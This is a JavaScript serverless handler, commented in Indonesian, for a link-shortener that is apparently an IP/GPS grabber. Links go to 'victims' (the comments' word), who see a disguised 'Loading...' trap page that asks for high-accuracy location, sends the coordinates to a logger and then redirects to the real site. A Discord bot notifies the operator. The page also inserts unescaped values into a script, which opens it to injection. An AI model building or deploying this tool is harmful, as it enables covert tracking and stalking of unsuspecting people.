import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);

async function sendDiscordDM(discordUserId, targetUrl, shortUrl) {
  const botToken = process.env.DISCORD_BOT_TOKEN;
  if (!botToken || !discordUserId) return;

  try {
    const dmChannelRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
      method: 'POST',
      headers: {
        'Authorization': `Bot ${botToken}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ recipient_id: discordUserId })
    });

    const dmChannel = await dmChannelRes.json();
    if (!dmChannel.id) return;

    await fetch(`https://discord.com/api/v10/channels/${dmChannel.id}/messages`, {
      method: 'POST',
      headers: {
        'Authorization': `Bot ${botToken}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        embeds: [{
          title: "🎯 Link Intel Berhasil Dibuat",
          color: 5814783,
          fields: [
            { name: "Target URL", value: targetUrl, inline: false },
            { name: "Short Link", value: shortUrl, inline: false }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });
  } catch (err) {
    console.error("Discord DM Error:", err);
  }
}

export default async function handler(req, res) {
  const { id, target, session } = req.query;

  // 1. KASUS 1: MEMBUAT LINK BARU
  if (id === 'create') {
    if (!session || !target) {
      return res.status(400).json({ error: "Missing session or target URL" });
    }

    try {
      const { data: sessionData, error: sessionError } = await supabase
        .from('sessions')
        .select('*')
        .eq('session_token', session)
        .single();

      if (sessionError || !sessionData) {
        return res.status(401).json({ error: "Sesi habis atau tidak valid. Silakan login ulang." });
      }

      const shortId = Math.random().toString(36).substring(2, 8);

      const { error: insertError } = await supabase
        .from('links')
        .insert([{
          short_id: shortId,
          target_url: target,
          user_id: sessionData.user_id
        }]);

      if (insertError) throw insertError;

      const shortUrl = `https://arex.my.id/api/r/${shortId}`;
      sendDiscordDM(sessionData.user_id, target, shortUrl);

      return res.status(200).json({ shortUrl });

    } catch (err) {
      console.error("Create Link Error:", err);
      return res.status(500).json({ error: "Gagal membuat link: " + err.message });
    }
  }

  // 2. KASUS 2: SAAT KORBAN MENGKLIK LINK PENDEK (Tampilkan halaman pelacak GPS/IP)
  if (id) {
    try {
      const { data: linkData, error: linkError } = await supabase
        .from('links')
        .select('*')
        .eq('short_id', id)
        .single();

      if (linkError || !linkData) {
        return res.status(404).send("Link tidak ditemukan atau sudah kadaluarsa.");
      }

      // Render halaman HTML jebakan yang akan meminta izin GPS & mencatat IP korban
      const htmlResponse = `
        <!DOCTYPE html>
        <html lang="id">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Loading...</title>
            <style>
                body { background: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .loader { text-align: center; }
            </style>
        </head>
        <body>
            <div class="loader">
                <h2>Memuat halaman...</h2>
                <p>Harap tunggu sebentar.</p>
            </div>
            <script>
                const targetUrl = "${linkData.target_url}";
                const shortId = "${id}";

                function sendLocationAndRedirect(lat, lon) {
                    // Kirim data GPS/IP ke endpoint logger kamu (atau langsung simpan via API)
                    fetch('/api/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ short_id: shortId, latitude: lat, longitude: lon })
                    }).finally(() => {
                        window.location.href = targetUrl;
                    });
                }

                // Coba minta izin GPS
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            sendLocationAndRedirect(position.coords.latitude, position.coords.longitude);
                        },
                        (error) => {
                            // Kalau GPS ditolak/gagal, tetap lanjut redirect tapi kirim tanpa GPS
                            sendLocationAndRedirect(null, null);
                        },
                        { timeout: 5000, enableHighAccuracy: true }
                    );
                } else {
                    sendLocationAndRedirect(null, null);
                }
            </script>
        </body>
        </html>
      `;

      res.setHeader('Content-Type', 'text/html');
      return res.status(200).send(htmlResponse);

    } catch (err) {
      console.error("Redirect Error:", err);
      return res.status(500).send("Internal Server Error");
    }
  }

  return res.status(400).json({ error: "Bad request" });
}